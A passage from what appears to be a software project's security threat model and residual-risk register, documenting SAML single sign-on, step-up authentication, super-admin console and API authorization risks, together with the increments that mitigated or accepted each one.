| **`sso_auth_requests` grows without bound from an unauthenticated endpoint (P1b)** | Denial of service | ✅ **MITIGATED — Increment P1d**, and it had been a documented control that did not exist. The migration and `config/saml.php` both described "a scheduled prune" of rows past `expires_at`; **no such command, job or schedule entry was ever written**, and nothing runs the scheduler in production regardless — while `GET /sso/saml/login` is unauthenticated and writes exactly one row per hit. The two *newer* SSO-adjacent tables both received write-path trims for precisely this reason; the oldest of the three did not. Now trimmed in the same call as the mint, on the `sso_auth_failures` pattern. ⚠️ **The liveness predicate is the outer `AND`, and that is the whole design rather than a detail** — J3c2 ported a rank-only cap onto a table of *live* rows and produced unauthenticated denial of **authentication**, since anyone could push a member's pending row past the cap while they sat on a consent screen. Only rows that are already **spent** are eligible here, so the table is capped at N spent rows plus whatever the rate limiter admits inside one TTL — the honest division of labour, because deleting somebody's in-flight sign-in is not an acceptable answer to a capacity question. ⚠️ **AND "SPENT" WAS DEFINED ONE STATE TOO WIDELY, WHICH P1e HAD TO CORRECT ON THIS VERY ROW.** The predicate treated `consumed_at IS NOT NULL` as finished, but since P1c the ACS consumes a row and *then* hands the browser to a completion hop — so this trim was eligible to delete sign-ins that were still in flight, which is the same J3c2 defect one layer in. Corrected to three arms, with a third term added to the bound: N spent rows, plus one request TTL of limiter, plus one completion window of whatever the tenant's own IdP signs. §9 item 27. ⚠️ **The bound is best-effort, and the code says so rather than this row overclaiming it.** It is a DELETE added to the authentication mint path, where two concurrent mints for one tenant can deadlock over overlapping row sets — so a failure is logged and swallowed on the `SsoAuthFailureRecorder` precedent, because housekeeping must never decide whether a sign-in begins. What that buys is the right failure direction: a trim that cannot run leaves the table larger, where an unguarded one would answer `GET /sso/saml/login` with a 500. |
| A step-up is completed by the wrong session, or steered to an attacker's page (P1c) | Elevation of privilege / Spoofing | **Mitigated.** `RequireRecentPassword` keeps its window, its four routes and its requirement, and changes only the mechanism — a JIT-provisioned member's password is 64 discarded random bytes, so the gate was a dead end for exactly the people SSO exists to serve, including the surface an admin would use to fix a broken SSO configuration. **The fork is keyed on the SESSION, not the account** (§D22): one person may hold a password *and* sign in through the IdP, and a hash of 64 random bytes is indistinguishable from a hash of a real password, so the account-level inference is both wrong and unavailable. Completion is a **same-site GET** — `SameSite=Lax` does send cookies on a top-level navigation — which is the only point where all three conditions hold at once, the third being that `sso_auth_requests.user_id` matches the person actually signed in *here*. ⚠️ **That last clause was true of the design and false of the deployment until P1e**, because the ACS was replacing the browser's session cookie before redirecting, so the member arrived at this hop with an empty session and `auth` bounced them to the sign-in page. The mechanism described here only started working when the ACS left the stateful middleware stack — §9 item 26. `verified_at`/`completed_at` are separate columns with a database CHECK pinning their order, redeemed by a conditional UPDATE; the row is found **by its `request_id`, never by being the newest**, because two step-ups begun inside one second are a tie PostgreSQL breaks by physical order. `return_to` is a **shape check, not a host comparison** (§D25) — a browser resolves a path against the origin it is already on, so there is nothing left to get wrong, where a host comparison is the check that keeps being got wrong — and it is re-sanitised on the way out as well as in, because the column is a `varchar` in a database people can edit. |
| Single sign-on silently drops a second factor the workspace or the person switched on (P1b) | Elevation of privilege | **Mitigated for the workspace's control; a deliberate divergence for the person's.** `EnforceTenantTwoFactor` guards the authenticated group and is **not** exempted for SSO arrivals, so a workspace that requires enrolment sends an SSO arrival to the interstitial exactly as it sends a password arrival — inferring an exemption from the presence of SSO would silently drop a control an admin switched on, and a workspace whose IdP already performs MFA turns the setting off, which is their decision to make. ⚠️ **A member's own confirmed TOTP is deliberately NOT challenged after a SAML sign-in**, which is the opposite of what this product does for Google (ADR-0019 §D11) and the reasoning is the difference between the two: an IdP is an enterprise trust anchor a workspace administrator chose and configured, whereas a Google account is a consumer credential the end user chose and this product cannot know whether anything protects it. ⚠️ **AND UNTIL M7 THIS ROW WAS THE ONLY PLACE THAT DECISION WAS WRITTEN DOWN.** The second-factor row above cited ADR-0016 **§D22** to explain its divergence, and §D22 is about step-up; the sentence it quoted is a *Consequences* bullet about the ORG-LEVEL control in the first half of this row, which decides the opposite polarity. **ADR-0016 §D32** now carries the personal-factor decision, so the two halves are a comparison between two numbered decisions rather than a threat-model paragraph standing in for one. Pinned by `SsoLoginCompletionWebTest`, which had asserted nothing about it. |
| **Single sign-on adopts the account behind an address a workspace merely invited (P1b, M9)** | Spoofing / Elevation of privilege | ✅ **MITIGATED — Increment M9**, and the table had carried **no row for SSO account adoption at all** until this one, including for M1's own adoption guard. The guard M1 added refused an existing account only when this workspace held **no** membership row for it; a row of any other status disarmed it, and the comment above it said so on purpose — *"a membership row of ANY status means this workspace has already made a decision about that person."* **A row is a decision about an ADDRESS, and so is an IdP assertion.** `MemberController::invite()` validates `['required', 'email', 'max:255']` with no domain-ownership check at any layer, and `resolveOrCreateUser()` binds the invitation to the address's existing global identity on `pgsql_auth`, so an admin of any SSO-entitled workspace could invite `victim@othercompany.com`, assert it at an IdP they configured themselves, and hold a session as the victim — **at the role they chose when inviting**, because `roleFor()` honours the invited role. ⚠️ **It needed no emailed token, which makes it strictly stronger than the invitation-door takeover M8 closed**, and `jit_provisioning_enabled` did not gate it: `Invited` bypassed the toggle by explicit condition, so no configuration protected a workspace. §D32 completes it — a SAML sign-in does not challenge a personal second factor, so an enrolled victim was not protected either. The provisioner now asks `TenantMembershipService::identityIsEstablished()` — M8's predicate, reused rather than re-derived — for `Invited`, `Declined` and `Removed` alike: `Removed` because an admin could otherwise re-adopt somebody they had just removed, which is the sanction-laundering the `Suspended` refusal exists to prevent one status along, and `Declined` because SSO must not overturn the invitee's own answer. A never-used placeholder still completes its invitation, which is asserted as a passing control rather than described. ⚠️ **The refusal precedes every write, and that is load-bearing**: `attachMember()` force-fills `invite_token => null`, so an adoption also consumed the real invitee's emailed link — their own link then 404'd and the whole event was indistinguishable from an ordinary expired invitation. ADR-0016 §D33 carries the decision and the two rejected alternatives; **residual 32** carries what it narrows rather than closes. |

Given the super-admin is the account with, by definition, no per-tenant blast-radius ceiling:

- **Recommendation (new): mandatory multi-factor authentication for every account with `is_super_admin = true`.** Nothing in any existing doc currently requires this — flagged here as a hard requirement given the account's blast radius, not an optional hardening.
- **Recommendation (new): a dedicated, narrower network/access boundary for the super-admin console** (e.g., IP allowlisting, or a separate admin subdomain not linked from ordinary tenant-facing navigation) — reduces the attack surface an external attacker can even discover, independent of the account's own credential strength.
- Every recommendation in `docs/multi-tenancy-rbac-design.md` §9 (narrow audited service layer, elevated Postgres role, full `Auditable` logging) already applies and is not repeated here.
- **As built (I7b) — the console's read surface over `audits` was NARROWED, not widened, and the obvious implementation was the dangerous one.** Giving `/admin/audit-log` its rows took one line of the existing helper, `applySuperAdminBypass('audits', ['SELECT'])`, whose gate is unrestricted; on a strictly tenant-scoped, append-only table that would have made every tenant's complete history readable by the operator — form titles, reviewers' `returned_reason` values, membership changes across the whole deployment — in order to display a handful of platform-settings rows. What shipped instead is `audits_platform_select`, gated on `app.is_superadmin_context` **and** `tenant_id IS NULL`. So `meridian_superadmin` now holds `SELECT` on `audits`, but a credential compromise plus the GUC yields **platform rows only**: the tenant slice remains unreachable from that role, asserted directly against `pg_policies` and mutation-verified. The generalisable rule for the next console surface: a carve-out over a table whose base policy is not nullable-global must be narrowed to the slice it serves.
- The three open questions `docs/multi-tenancy-rbac-design.md` §9 already flagged (impersonation mechanics, tenant-visible audit-log surfacing of super-admin actions, internal-staff access graduation) remain **open** from a security perspective too — resolving them has direct security implications (e.g., impersonation without a distinguishing audit column would make a compromised super-admin session indistinguishable from the impersonated user's own actions in the audit trail), which is worth weighing when that doc's open questions are eventually settled, not a new question this document introduces.
- **As built (I11a) — the parenthetical risk above is CLOSED IN THE LEDGER, and only there.** `audits.acting_as_user_id` exists and `AuditLogger` writes it on every row, so an impersonated action is now structurally distinguishable from the impersonated user's own: `user_id` records whose authority it ran under, the new column records who was driving, and neither is inferable from the other. **The column landed before the feature (I11b) on purpose** — the alternative ordering has a release in which impersonation exists and the ledger cannot describe it, which is exactly the state this bullet warns about. What is NOT yet mitigated is impersonation's own attack surface (how a session is minted across hosts, who may be a target, how it ends); that is I11b's, and it is the remaining half of this row.

## 9. Residual Risks — Summary

Honestly restating, in one place, every "Residual" and "Open" verdict from the sections above, so nothing is buried in a large document:

1. UUIDv7's time-ordering leaks relative creation-time ordering between two known IDs (§3) — accepted trade-off for index performance.
2. ~~Guest bot/spam flooding is rate-limited already (`docs/architecture/technical-architecture.md` §7.2), but the optional CAPTCHA challenge for spam-prone public forms (§4) is not yet implemented.~~ ✅ **CLOSED by Increment I8b (2026-08-08)** — a self-hosted proof-of-work challenge plus a per-form rate limit, both per-form and both default-off; see §4's row for the two deliberate deviations from what that row recommended, and for the one recorded residual (a cache flush makes unspent challenges replayable for one TTL window).
3. Webhook replay protection (signed timestamp + tolerance window) and delivery-time SSRF re-validation (creation-time validation already exists) have no mitigation until Doc #15 adopts this document's recommendations (§5).
4. File-upload MIME sniffing and quota enforcement have no mitigation until implemented (§6).
5. Expression-engine resource limits (AST depth, evaluation-time budget) have no mitigation until implemented (§7).
6. Super-admin **MFA is now implemented** (Increment B2c: the `superadmin.mfa` middleware blocks console access for any `is_super_admin` account without confirmed 2FA). Network hardening (IP allowlist / non-discoverable admin subdomain) remains deferred (§8); the console is currently protected by the `superadmin` gate (404 non-disclosure) + mandatory MFA + the elevated-role RLS carve-out, not yet by a network boundary.
7. The three open RBAC-doc questions (impersonation, audit visibility, staff graduation) remain unresolved and have direct security weight, not just a UX one. **NARROWED by I11a:** impersonation's *audit* half is closed — `audits.acting_as_user_id` is written on every row and read by both viewers, the export and the API, so a compromised operator session can no longer be mistaken for the user's own actions in the trail. Its *mechanism* half is still open and is I11b's: minting a session across a host-only cookie boundary, bounding who may be targeted, and ending it. Audit visibility and staff graduation are untouched by this increment.
8. **Native connector token custody (§5, ADR-0009)** carries two accepted residuals and one open item. Accepted: the OAuth `state` is stateless and therefore replayable within its ~10-minute TTL (bounded by single-use provider codes, and a successful replay only rewrites the tenant's own connection); and token custody relies on Laravel's `encrypted` cast under `APP_KEY` rather than an external secret manager, which ADR-0005's single-box deployment does not have. **Open:** `APP_PREVIOUS_KEYS` is undocumented, so an `APP_KEY` rotation would silently make every stored connector token undecryptable — the mitigation is a documented rotation procedure owned by Doc #22, not shipped with the connector framework. **WIDENED (P1d): the rotation window has a second consequence this item had not recorded, and it reaches an authentication control.** With `APP_PREVIOUS_KEYS` set, `originalIsEquivalent()` short-circuits to false for *every* `encrypted:` cast, so `sso_connections.idp_certificates` is permanently dirty and any model `save()` on that row would rewrite a tenant's SAML trust anchor on every single sign-in. The SSO seam avoids it structurally (a one-column UPDATE, never `save()`), but the same rotation procedure Doc #22 owes is what stops the next author reintroducing it — so this item is about more than token decryptability.
9. **Output encoding on server-rendered surfaces (§2, §7, Doc #26)** is enforced by **convention plus one test per surface**, not by a mechanism that fails the build. Doc #26 §5.1 considered and did not take the stronger option — a renderer returning a value object with no `__toString()` and one method per output context, which would make a forgotten escape a PHPStan-level-8 error the way `OcrFieldEligibility`'s `default`-less match makes an unclassified field type one — so a surface added after that document escapes correctly only if its author reads the table. Compounding it: **CSP is not a second layer here.** `PublicRuntimeSecurityHeaders` deliberately sets no `default-src`/`script-src` and covers four routes, so an injected template faces no script restriction at all. **TWO** of the table's rows remain **live defects today**, for tenant- and third-party-controlled strings: markdown-syntax injection in queued mail (`withSecuredEncoding()` still off, H3/H23) and spreadsheet formula injection in exports (its own increment). The third — `mrkdwn` injection in connector messages — was **closed by H6a**, which also shipped the Inertia page-data test; H6a deliberately did not touch the other two, since closing them would have absorbed another increment's scope. The named escalation, if a *second* surface is found unescaped after that contract lands, is to adopt the value-object forcing device.

10. **A deleted tenant's audit history becomes readable by the platform operator (§8, I7b).** `tenants` has no `SoftDeletes` and `audits.tenant_id` is `ON DELETE SET NULL`, so hard-deleting a workspace moves its whole ledger into the `tenant_id IS NULL` slice that `/admin/audit-log` reads — including tenant-authored payloads that, while §2-redacted, were previously unreachable by anyone outside that workspace. Accepted rather than mitigated: the alternative (a cascade) would destroy a ledger this project commits to retaining, and the rows describe a tenant that no longer exists. Recorded because it is a real change in who can read what, produced by an FK referential action rather than by any policy anybody wrote.

11. **Four super-admin console pages now have no automated accessibility scan (I5, I7a, I7b ×2).** `/admin/*` is excluded from the Playwright axe sweep because `superadmin.mfa` requires a TOTP that CI cannot produce, so heading order, contrast and focus behaviour on those pages are covered only by Storybook's per-primitive axe job plus hand-written Vitest assertions (e.g. the filter-heading case that stands in for `heading-order` on the platform ledger's empty state). Two concrete defects have already been found by reading rather than by a gate — a `danger-text` token that fails contrast in dark, and an admin nav bar that overflows below ~900px — which is the evidence that the compensating control is weaker than the sweep it replaces. Closing this properly means a CI-injectable TOTP or a test-only super-admin bypass, both of which are their own risk decisions.

12. **There is no self-service escape from a two-factor enrolment whose device is lost, and J3c1 revealed it rather than caused it.** `two-factor.disable` sits behind `auth` + `password.confirm` — both of which are *past* the challenge — so the only exit a locked-out person has is a recovery code, and an exhausted or never-saved set needs an operator with database access. This was masked while the challenge page was unreachable: everyone was locked out, so nobody was locked out *specifically*. Now that enrolment completes end to end it is a live support path with no product surface. Closing it means a deliberate decision about account recovery — an emailed re-authentication, an admin-initiated 2FA reset carrying its own audit row, or an explicit "contact support" dead end — each a new trust boundary rather than a UI addition. Recorded, not scheduled. Two related gaps: nothing warns a user that their recovery codes are running out, and `E2eSeeder`'s two-factor fixture deliberately carries an EMPTY recovery array, so that identity can render the challenge and pass a TOTP but cannot complete a recovery-code sign-in.

13. **Password-reset token replay within the validity window (§8)** is bounded by the token TTL and by single-address delivery, but is uninstrumented: nothing in the application would surface the same reset link being redeemed twice.

14. **A person whose local account is unverified is refused by Google sign-in and is not told why (§8, J3c2).** ADR-0019 §D4's refusal is deliberate — linking onto an unverified account hands it to whoever registered on that address first — and §D9's uniform bounce is deliberate too, because "your local account is not verified" confirms to a stranger that an account exists on that address. The two are individually right and jointly produce a real usability cost: the person's only route is to verify by email or to use their password, and nothing on screen says so. Accepted rather than mitigated; the escape hatches both exist and both work.

15. **A Google `google_id` link survives a workspace-level refusal that follows it (§8, J3c2), and the ordering that produces this was forced by a deadlock.** The link write runs on `pgsql_auth`, a separate session, so it is not enrolled in the provisioner's transaction. The first implementation ordered it LAST, inside that transaction, so no reachable rollback could strand it — **and it hung forever**: `users.google_id` is UNIQUE, so the UPDATE takes a `FOR UPDATE` row lock, while the `tenant_users` INSERT in the same transaction takes `FOR KEY SHARE` on the same `users` row for its foreign key. The two conflict, and the transaction holding the second cannot commit until the first returns, so the request blocks on itself with no error and no timeout. Measured rather than reasoned: a test run sat for over three hours with `pg_blocking_pids()` naming the application's own connection. Resolution and linkage therefore now run BEFORE the transaction opens. The residual is the consequence: a suspended membership, a closed workspace or a full seat quota refuses *after* the account has been linked. That is correct on its own terms — every §D4 condition for linking was met, and linkage is an account fact while membership is a workspace one — and the next attempt resolves by `sub`. It is recorded because it is a real change in when a durable write becomes visible, not because it is thought to be wrong.

16. **Nothing in the product tells a workspace that Google sign-in was attempted and refused (§8, J3c2).** ADR-0019 §D9 argues the absence: `sso_auth_failures` exists because an admin configures a SAML trust anchor and must debug their own certificate, while this flow has no tenant-side configuration to get wrong. The consequence is that a workspace cannot distinguish "nobody used the button" from "everybody who used it was refused" without reading server logs. Its revisit trigger is the same as §D9's — any tenant-visible configuration for this flow.

17. **A person whose SAML sign-in fails is told nothing, permanently (§8, P1b/P1c).** §D19's uniform 404 is the control: an ACS that distinguished "wrong audience" from "already consumed" is an oracle for anyone tuning a forgery. The admin's half of this **is** closed — `sso_auth_failures` and the settings panel answer "why can my colleague not sign in?" behind `auth` plus `can:tenant.settings.manage`, which is nothing an attacker reaches without already administering the tenant they are attacking. The person's half never closes, because they are the unauthenticated caller the posture is about. Accepted, and stated so it is not rediscovered as a bug report.

18. ✅ **CLOSED IN M2 — an expired identity-provider signing certificate no longer authenticates assertions (§8, P1a → M2).** Expiry is still deliberately not an import refusal (§D11, so a correctly-executed rollover does not fail at the SP), but the login path now asks the question the settings screen was already answering: `SsoLoginService::consumeAssertion()` refuses ahead of the whole sequence when `SsoCertificateInspector::signingState()` reports no usable certificate, under its own `idp_certificate_unusable` reason so the workspace's own admin sees why. The rule is §D11's roll-up (refuse only when *no* certificate in the set is currently valid), which is what keeps an unfinished rotation from becoming a workspace outage. ⚠️ **THE ITEM DOES NOT DISAPPEAR, IT NARROWS:** an expired certificate sitting beside a valid one in the same set can still carry a signature, because php-saml receives the whole set and §D31 rejects filtering it (skew would become an availability control). §D10's atomic whole-half import is what stops such a set forming; the revisit trigger is the first tenant observed with a mixed set. **And two documentation corrections travelled with it**: the `invalid_assertion` hint used to tell admins "this is what an expired or rotated signing certificate looks like", which was half false — an expired anchor produced a session, not that row — and the settings-card warnings for the three unusable states now open with "Sign-in is refused" rather than reading as an errand.

19. **The 60-second clock-skew narrowing covers `Conditions` only (§8, P1b).** php-saml's hard-coded 180-second allowance still governs `SubjectConfirmationData`'s validity bounds and `SessionNotOnOrAfter`, so the window in which a captured assertion stays replayable is 60 seconds on the element this SP re-checks and up to 180 on the ones it does not. `config/saml.php` and the validator's docblock both asserted the tighter figure without naming an element; both are corrected in P1d. Bounded by the replay ledgers, which are what actually make a captured assertion single-use — the skew bound is the second layer, not the first.

20. **The assertion-id replay ledger is cache-backed, so a cold Redis reduces it to a no-op (§8, P1b).** Deliberate and stated in the design (§D18): the two mechanisms run **database-first**, and `sso_auth_requests.consumed_at` cannot be flushed. What a lost cache costs is the *second* mechanism — the one covering an IdP that mints two assertions for a single request — for as long as the cache is cold. Accepted because the durable one is the load-bearing one; recorded because "two independent mechanisms" reads as two guarantees and only one of them survives a flush.

21. **The SAML failure panel can be emptied by the stranger it exists to describe (§8, P1c).** The ACS is unauthenticated at 60 requests a minute, the per-tenant cap is 200 rows and the panel renders the newest 20, so roughly three and a half minutes of grinding displaces every genuine failure and continues to. The cap itself is the design — an unauthenticated writer must be bounded, and a nightly prune would be a bound living in the repository rather than on the machine — and the harm is confined to **observability**, since these are finished log rows with no in-flight state to destroy. That is the one respect in which it is milder than the same trim shape ported to `google_auth_requests`, where evicting live rows was denial of *authentication*. Recorded because "bounded" and "adversarially emptiable" are different properties and the design notes only claimed the first.

22. ✅ ~~**The SAML login arm binds an assertion to a request but not to a browser (§8, P1b).**~~ **CLOSED by increment P1e.** It was reproduced rather than reasoned: `GET /sso/saml/login` wrote zero session keys, and an assertion submitted from a session that never visited the mint endpoint answered `302 /dashboard` with the poster signed in as the asserted subject — the same defect J3c2 found on the Google path, and the same misreading, a control that proves **provenance** relied on as one that proves **origin**. It was not fixable by Google's method, because the ACS is a cross-site POST under `SameSite=Lax` and cannot read the minting browser's session at all. The login arm now completes on a same-site GET that compares the flow's **own** id against one the mint wrote into that browser's session, and the ACS creates no session on either arm. ⚠️ **Closing it turned up two further defects that were nobody's row and are worth the sentence each** — see items 26 and 27.

23. **Federation lifecycle: neither Single Logout nor SCIM exists (§8, ADR-0016).** SLO is out of scope because it is inconsistently implemented across IdPs and a partial implementation is worse than none — a logout that silently fails to propagate is a security claim the product cannot honour — so termination is local only, and a session survives at this SP after the person has signed out at their IdP. SCIM is likewise out of scope: **JIT creates and nothing removes**, so deprovisioning is manual. Both are said plainly here rather than left to be inferred from the presence of SSO, which is the reading that would get them wrong.

24. **An admin whose SSO is broken cannot step up through SSO, and the escape hatch is unlinked (§8, P1c).** The hatch works — `/user/confirm-password` is routed on the tenant subdomain, a member with no usable password reaches it by password reset, the fork falls back to the password prompt whenever SSO cannot serve at all, and `GET /settings/sso` carries no step-up gate so the failures panel stays readable. What is missing is the **link**, which belongs on the auth vertical's own page and is owed by that lane rather than shippable from the SSO seam. Until then the route is reachable and undiscoverable.

25. **Two smaller stated costs (§8, P1b/P1c).** A NameID format other than `emailAddress` resolves to no user at all, because this application's identity key *is* the email address — the settings screen says so rather than letting it present as an intermittent login failure. And a session established before P1c carries no identity-source marker, so an SSO member holding one gets the password prompt instead of the IdP; nothing backfills it because the fact was never recorded, and it heals on their next sign-in.

26. ⚠️ **The ACS was replacing the browser's session cookie, so P1c's step-up hop had never worked in a real browser (§8, P1e).** Found while building P1e's own hop and **measured against a running stack rather than reasoned**: inside the `web` group `StartSession` runs on the ACS, finds no cookie — `SameSite=Lax` withholds it from a cross-site POST, which is the premise the whole seam rests on — generates a fresh session id, and `addCookieToResponse()` emits it **unconditionally**, its only guard being that a session driver is configured. The response carried `Set-Cookie: <app>-session=<a new, empty session>; path=/` plus a regenerated `XSRF-TOKEN`, host-only and same-path, so a browser **replaces** the member's real cookie and then follows our 302 carrying the empty one. A member completing a step-up therefore arrived with no session, was bounced to the sign-in page by `auth`, and had lost the session the step-up was being performed for. **No test in this repository could see it**: the Pest client never feeds `Set-Cookie` into the next request and the session store is memoised per process, so the harness models the session as a process global while a browser models it as a cookie — and worse, the breakage and P1e's security refusal share one observable, a 404 at the hop. **Mitigated:** the ACS is out of the stateful stack entirely, which is what its own docblock had claimed since P1b, and the one assertion that can see this is a response-header assertion.

27. ⚠️ **The AuthnRequest store's trim was evicting sign-ins that were still in flight (§8, P1e).** P1d bounded that table and promised in writing that "no in-flight sign-in is evictable by anyone at any volume". The predicate called a row dead on `consumed_at IS NOT NULL`, but since P1c the ACS consumes a row and then hands the browser to a completion hop — so between those two requests a row is consumed **and still needed**. Reachable rather than theoretical: `issued_at` is the mint, up to `authn_request_ttl_seconds` (600s) before the consume, so a member who spends three minutes at their identity provider owns a row ranked three minutes down the eviction ordering at the instant it becomes eligible, and `GET /sso/saml/login` is unauthenticated at 60/min per address. The victim is answered 404 after successfully authenticating and the log reads "unknown request", pointing an operator at replay rather than at eviction — the identical misdiagnosis J3c2 records for the sibling table, whose corrected shape had been ported **forward** and never back. Latent for step-up; under P1e it would have become unauthenticated denial of authentication for a whole workspace. **Mitigated**, with the honest bound stated: the ceiling is now N spent rows, plus what the limiter admits inside one request TTL, plus what the tenant's own IdP signs inside one completion window.

28. **A signed assertion whose redirect is never followed still provisions an account and consumes a seat (§8, P1e).** Provisioning stays at the ACS, which **diverges from ADR-0019 §D7** ("a callback the browser never follows leaves no account behind") deliberately: Google's callback is reachable with any consumer account, whereas reaching the SAML provisioner at all requires an assertion signed by the tenant's own trust anchor. A half-followed flow therefore leaves an account for somebody that directory genuinely authenticated, which is what JIT provisioning is for, and it is bounded by `jit_provisioning_enabled` and the seat quota exactly as a completed sign-in is. Recorded as accepted rather than omitted; moving provisioning to the completion hop would mean carrying the ASSERTED identity — the email and display name the IdP vouched for — on the row. ⚠️ That is **not** discharged by P1e's `resolved_user_id`, which references an account that must already exist: provisioning at the hop needs the identity of somebody who does not have one yet, i.e. the `google_auth_requests` shape, with the PII and the disclosure rules that implies. A schema change owed its own increment.

29. ⚠️ **One ACS failure is not the uniform 404 that §D4 promises, and P1e is where it became visible (§8).** `SsoAcsController` catches `SsoAuthenticationException` only. `SsoUserProvisioner` reaches `TenantMembershipService::attachMember()`, which throws `MembershipException::unknownRole()` when `sso_connections.default_role_name` names a role absent from the catalog — reachable through a seeded-catalog change or a hand-edited connection row. That escapes the catch and is rendered by the global handler as `back()->withErrors(...)`, so the identity provider's browser is 302'd to its own `Referer` with no message: a response distinguishable from every other refusal, which makes it a small oracle for "this workspace's SSO is misconfigured", and a dead end for the member. **Pre-existing** — but P1e removed the session from that path (§9 item 26), so the flash it writes now lands in a store nobody saves, and P1e is the increment that claimed this pipeline was fully accounted for. **Not fixed here, deliberately:** widening the catch changes the ACS's error contract and owes its own increment with a `SsoFailureReason` so the refusal reaches the tenant-facing panel as a 404 like the rest. Recorded rather than left for the next reader to rediscover from a 302 they cannot explain.

30. ⚠️ **An account created by central-host registration and never used is indistinguishable from an invite placeholder, so a token holder can still set its password (§8, M8).** `CreateNewUser` does not stamp `email_verified_at`, central-host registration creates no membership, and `google_id` / `two_factor_confirmed_at` are NULL — so every arm of `identityIsEstablished()` reads false and such a person is still handed the password-setting arm. **Accepted, and strictly narrower than what M8 closed** (which also covered every verified-then-email-changed member and every 2FA-enrolled one). Closing it needs the one signal this schema cannot express: *"has a usable password"*. The available remedy is a positive `users.password_set_at` column stamped wherever a person actually sets their own password — priced during M8 and not taken, because it edits `app/Actions/Fortify/`, needs a backfill, and moves the seeded invitation fixture that the accessibility scan reads. **Revisit trigger:** the first report of a stranded or hijacked self-registered account, or any other consumer needing to distinguish a placeholder from a real credential — at which point one column answers both.

31. ⚠️ **M8 removed an accidental backstop on the pre-auth connection, and the loss is worth stating because it was load-bearing in a mutation argument (§8, M8).** `meridian_auth` previously held `SELECT, UPDATE` on `users` **and nothing else**, which is why `MemberSearchArm` recorded that swapping it to `pgsql_auth` *"fails LOUDLY (11 cases red) instead of silently returning every tenant's members"*. `2026_08_17_000107` grants that role `SELECT ON tenant_users`, so the same mistake now succeeds quietly. **Accepted**, because the grant is SELECT-only, role-scoped, and consumed by exactly one server-derived equality predicate — and because what actually holds the line is the rule (RBAC §9: no user-supplied predicate on that connection) plus `SearchMemberConnectionTest`'s three STRUCTURAL pins, which do not depend on the database refusing anything. **Revisit trigger:** any proposal to weaken one of those three pins, or a second consumer of the new grant.

32. ⚠️ **A workspace may still assert any address at its own identity provider, because nothing verifies that it controls the domain (§8, M9).** M9 refuses to *adopt an established account*, which closes the takeover; it does not establish that `acme.test`'s connection is entitled to speak for `acme.test` at all. A brand-new address in any domain still provisions through JIT exactly as before — correct behaviour today, and the seam a domain-ownership control would tighten. **The structural fix is filed rather than assumed**: a `sso_verified_domains` table, a DNS TXT challenge, an admin surface on `/settings/sso`, and a grandfathering decision for every live connection. It was rejected as M9's shape precisely because the takeover would have stayed live for the whole of that work. ⛔ **Do not read this residual as "M9 was partial"** — the two controls answer different questions, and the one M9 answers is the one that had a live exploit.
33. ⚠️ **A Group-B route that is not resource-bound has nothing for `can:` to attach to, and the standing rule was phrased so that it did not notice (§2, M13).** M13 closed the two live instances — `GET /api/v1/sync/manifest` served any form's complete authored schema to any holder of `read:forms`, and `POST /api/v1/sync/submissions` created submissions against any form in the tenant for any holder of `write:submissions`, both while the bound-model routes onto the same artefacts required a per-form grant — by moving each gate into its controller, which is what `POST /form-templates` had been doing since G9a without anyone naming it as the pattern. **What stays residual is the shape, not those two routes**: an ability scopes the TOKEN, RLS scopes the TENANT, and a route whose resource arrives in the body gets neither an automatic per-resource check nor a compiler complaining about its absence. `tests/Feature/Api/GroupBPolicyGateTest.php` walks the live route table and fails on a new route carrying neither a `can:` middleware nor a written reason it needs none, which converts the omission from silent to loud — but it cannot judge whether an allowlisted reason is a *good* one, and two of the eight entries currently in that list read exactly like the six correct ones did for as long as they were wrong. ⛔ **The exposed principals were not the obvious ones and the backlog row named one that cannot exist**: a Viewer can never hold `write:submissions` at all (it maps to `submissions.create`, which they do not have), while a **Reviewer** — authorized to encode on *zero* forms through the web app, because `SubmissionPolicy::create` requires EDITOR capacity since G10a — reached *every* form through the sync route. **Read an ability map before believing a claim about who can exploit an ability gate.**

None of these are load-bearing blockers for Phase 0 scaffolding to begin — they are concrete, scoped implementation requirements to carry into the relevant future work (Docs #15, #24, and the actual Phase 1 build), tracked here so they aren't silently forgotten between "the doc that mentions it" and "the code that implements it."
